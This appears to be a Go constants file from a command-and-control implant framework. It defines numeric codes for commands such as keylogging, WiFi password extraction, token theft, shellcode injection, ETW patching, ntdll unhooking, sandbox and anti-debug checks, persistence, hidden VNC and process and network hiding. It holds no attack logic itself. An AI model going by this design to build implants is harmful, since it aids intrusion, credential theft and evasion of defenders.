package command

const (
	SLEEP       = 21
	PAUSE       = 22
	SHELL       = 23
	UploadStart = 24
	UploadLoop  = 25
	DOWNLOAD    = 26
	EXIT        = 27
	CD          = 28
	PWD         = 29
	FileBrowse  = 10
	EXECUTE     = 11
	PS          = 12
	KILL        = 13
	DRIVES      = 14
	MKDIR       = 15
	RM          = 16
	CP          = 17
	MV          = 18
	FileContent = 19
	Socks5Start = 20
	Socks5Close = 30
	FILESAVE    = 31 // 文件保存命令
	MODIFYTIME  = 32 // 修改文件时间命令
	HIDEFILE    = 33 // 隐藏文件命令
	UNHIDEFILE  = 34 // 取消隐藏文件命令

	// XTerm交互式终端命令（Linux原生PTY）
	INTERACTIVE_SHELL_START = 35 // 启动Linux原生PTY交互式终端
	INTERACTIVE_SHELL_INPUT = 36 // Linux原生PTY交互式终端输入
	INTERACTIVE_SHELL_STOP  = 37 // 停止Linux原生PTY交互式终端

	// Windows双引擎Shell命令（非交互式）
	CMD_MODE_START = 38 // 启动CMD模式
	CMD_MODE_INPUT = 39 // 发送CMD命令
	CMD_MODE_STOP  = 42 // 停止CMD模式
	WMI_MODE_START = 43 // 启动WMI模式
	WMI_MODE_INPUT = 44 // 发送WMI命令
	WMI_MODE_STOP  = 45 // 停止WMI模式

	// 屏幕截图命令
	SCREENSHOT1 = 46 // 屏幕截图命令

	// 屏幕监控命令
	START_MONITOR     = 47 // 开始屏幕监控
	STOP_MONITOR      = 48 // 停止屏幕监控
	MONITOR_FRAME     = 49 // 监控帧数据
	GET_MONITOR_FRAME = 50 // 手动获取监控帧

	// HVNC 隐藏桌面（Hidden VNC）
	HVNC_START = 55 // 启动 HVNC 会话（隐藏桌面）
	HVNC_STOP  = 56 // 停止 HVNC 会话
	HVNC_INPUT = 57 // HVNC 输入事件（鼠标/键盘/缩放控制）
	HVNC_FRAME = 58 // HVNC 帧数据（客户端主动推送）

	// 文件管理增强
	UPLOAD_ACK     = 59 // 上传分块确认（客户端→服务端）：requestId(4)|seq(4)|total(4)
	FILE_OP_RESULT = 88 // 文件操作结果确认（客户端→服务端）：requestId(4)|ok(1)|msg

	// SOCKS5代理隧道命令（参照rshell优化）
	SOCKS5_CONNECT = 60 // 建立SOCKS5连接
	TCP_FORWARD    = 61 // TCP端口转发
	HTTP_CONNECT   = 62 // HTTP连接代理
	UDP_SESSION    = 63 // UDP会话请求
	TUNNEL_DATA    = 64 // 隧道数据传输
	TUNNEL_CLOSE   = 65 // 隧道关闭请求
	HTTP_TUNNEL    = 66 // HTTP隧道代理（反向代理模式）

	// 反向SOCKS5代理命令（Rshell架构）
	ReverseSocks5Start = 70 // 启动反向SOCKS5代理
	ReverseSocks5Close = 71 // 关闭反向SOCKS5代理

	// 新的统一文件编辑命令
	FILE_EDIT_READ  = 80 // 读取文件内容进行编辑
	FILE_EDIT_WRITE = 81 // 写入编辑后的文件内容

	// Windows内存执行命令（rshell功能移植）
	ExecuteAssembly = 40 // .NET程序内存执行
	InlineBin       = 41 // 二进制文件和shellcode内存执行

	// Linux插件执行命令
	ExecuteLinuxScript = 51 // Linux脚本内存执行(fileless sh -s 管道)
	ExecuteLinuxBin    = 52 // Linux二进制执行(/tmp 写执行删)

	// BOF执行命令(Beacon Object File, COFF内存执行)
	ExecuteBof = 53 // BOF(COFF)内存执行

	// 文件执行命令(写临时文件->执行->捕获输出->删除;支持 Donut 无法转换的 Go/Rust PE)
	ExecuteFile = 54 // 临时文件执行(非内存加载)

	// 密钥协商和管理命令
	KEY_NEGOTIATION    = 90 // 密钥协商消息
	KEY_UPDATE_REQUEST = 91 // 密钥更新请求
	KEY_UPDATE_CONFIRM = 92 // 密钥更新确认
	KEY_SWITCH_READY   = 93 // 密钥切换准备就绪
	KEY_HEALTH_CHECK   = 94 // 密钥健康检查

	// 心跳命令
	HEARTBEAT = 95 // 心跳包

	// 持久化命令（B8）：cmdBuf = "方法 [名称]"，须与客户端 core/services/types.go PERSIST 一致
	PERSIST = 100 // 持久化（registry|schtasks|startup / cron|bashrc）

	// 工具箱命令（须与客户端 core/services/types.go 一致）
	CLIPBOARD  = 102 // 剪贴板读取
	WIFI       = 103 // WiFi密码提取
	SELFDELETE = 104 // 自删除

	// 第二梯队工具
	KEYLOG_START  = 105 // 启动键盘记录
	KEYLOG_GET    = 106 // 获取键盘记录
	KEYLOG_STOP   = 107 // 停止键盘记录
	SERVICES      = 108 // 列出服务
	SERVICE_START = 109 // 启动服务
	SERVICE_STOP  = 110 // 停止服务
	REG_QUERY     = 111 // 注册表查询
	// INJECT(112) 已废弃：文件路径注入落盘暴露痕迹，仅保留内存注入通道 INJECT_MEM(127)
	INJECT_MEM = 127 // 内存注入（纯内存接收 shellcode，不落盘）

	// A1-A7 客户端能力增强
	ETW_PATCH      = 113 // ETW 补丁（屏蔽遥测）
	UNHOOK_NTDLL   = 114 // ntdll unhooking
	SANDBOX_CHECK  = 115 // 沙箱检测
	ANTIDEBUG      = 116 // 反调试检查
	WMI_PERSIST    = 117 // WMI 无文件持久化（add|remove|list）
	PSEXEC         = 118 // 横向移动：远程执行（target|user|pass|cmd）
	AD_ENUM        = 119 // 域信息收集
	SELF_UPDATE    = 120 // 客户端自我更新
	// 删除进程文件并退出（"删除客户端"流程）：重命名解锁 + 延迟删除 + 进程退出
	SELFDELETE_EXIT = 121 // 客户端退出并删除自身二进制

	// Linux 隐藏命令（B12，须与客户端 core/services/types.go 一致）
	HIDE_PROCESS = 122 // 进程名隐藏（prctl PR_SET_NAME + argv[0] 覆盖）
	HIDE_NET     = 123 // 网络连接隐藏（LD_PRELOAD 过滤 /proc/net，需 root）

	// Token 操作链（A8，须与客户端 core/services/types.go 一致）
	MAKE_TOKEN  = 124 // 创建令牌并模拟（make_token <user>|<pass>|<domain>）
	STEAL_TOKEN = 125 // 窃取进程令牌（steal_token <pid>）
	REV2SELF    = 126 // 恢复原始令牌（rev2self）

	// 批量命令包装（B5，仅轮询协议 HTTP/DNS 批量下发时使用；仅上报 b1 能力的
	// 新客户端会收到，旧客户端按单条下发故永不见此号）。帧格式：
	// count(4) + N×[len(4)|cmd]，cmd 为完整单条命令帧(cmdType(4)|cmdBuf)
	CMD_BATCH = 128
)
